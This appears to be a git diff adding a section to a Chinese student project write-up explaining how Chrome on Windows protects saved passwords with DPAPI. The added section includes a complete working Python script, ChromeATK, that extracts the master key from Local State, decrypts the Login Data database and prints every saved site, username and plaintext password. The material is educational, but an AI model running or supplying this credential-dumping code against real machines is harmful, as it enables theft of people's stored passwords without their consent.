@@ -91,12 +91,71 @@ Merkel tree示例如图所示：
 
 
 
-## Chrom记住密码原理概述
+## Chrome记住密码原理概述
 
+Chrome密码管理器与Firfox不同的是，其将密码和加密过的数据均存储在用户本地，以windows为例，Chrome将使用windows API **CryptProtectData**加密后的口令存储在AppData\Local\Google\Chrome\User Data\Default\ **Login Data**，将密码存储在AppData\Local\Google\Chrome\User Data\ ***Local State***。
 
+Chromee的立场是主密码提供了一种虚假的安全感，保护敏感数据的最可行保护方式是要取决于系统的整体安全性。所有，为了执行加密（在Windows操作系统上），Chrome使用了Windows提供的CryptProtectData API，该API允许已经用于加密的Windows用户账户去解密已加密的口令。所以也可以理解为主密码就是Windows账户密码，即只要登录了Windows账号，Chrome就可以解密口令，并导入密码管理器中。
 
+下面尝试编写代码chrom.py来调用CryptProtectData API解密密文，
 
+```python
+import os,json,base64,sqlite3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM 
+from win32crypt import CryptUnprotectData
 
+class ChromeATK:
+  def __init__(self):
+    self.local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
+    self.cookie_path = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\Default\Login Data"
+ 
+  def get_key(self):
+    with open(self.local_state, 'r', encoding='utf-8') as f:
+      base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
+    encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
+    encrypted_key = encrypted_key_with_header[5:]
+    key_ = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return key_
+ 
+  @staticmethod
+  def decrypt_string(key, secret, salt=None): 
+    nonce, cipher_bytes = secret[3:15], secret[15:]
+    aes_gcm = AESGCM(key)
+    return aes_gcm.decrypt(nonce, cipher_bytes, salt).decode('utf-8')
+ 
+  def password(self):
+    sql = "select username_value,password_value,signon_realm from logins"
+    with sqlite3.connect(self.cookie_path) as conn:
+      cu = conn.cursor()
+      res = cu.execute(sql).fetchall()
+      cu.close()
+      result = []
+      key = self.get_key()
+ 
+      for name, encrypted_value,website in res: 
+        if encrypted_value[0:3] == b'v10' or encrypted_value[0:3] == b'v11':
+          passwd = self.decrypt_string(key, encrypted_value)
+        else:
+          passwd = CryptUnprotectData(encrypted_value)[1].decode()
+        print('网站：{}，账户：{}，口令：{}'.format(website,name, passwd))
+ 
+ 
+if __name__ == '__main__':
+  c = ChromeATK()
+  c.password()
+
+```
+
+使用了`sqlite3`模块来连接并查询浏览器的登录数据表，然后使用`CryptUnprotectData`函数和`AESGCM`类来解密密码。具体功能包括：
+
+- `get_key`函数用于获取本地状态文件中存储的加密密钥。
+- `decrypt_string`函数用于解密加密的字符串。
+- `password`函数用于从数据库中获取保存的密码，并根据加密方式进行解密。
+- `__main__`中创建了一个`ChromeATK`对象并调用`password`函数来打印出所有密码的相关信息。
+
+可以得到解密后的账户信息：
+
+![image](https://github.com/xin-li-sdu/Projects-of-CSPIE/blob/main/Project17/picture/7.png)
 
 **参考资料：**
 
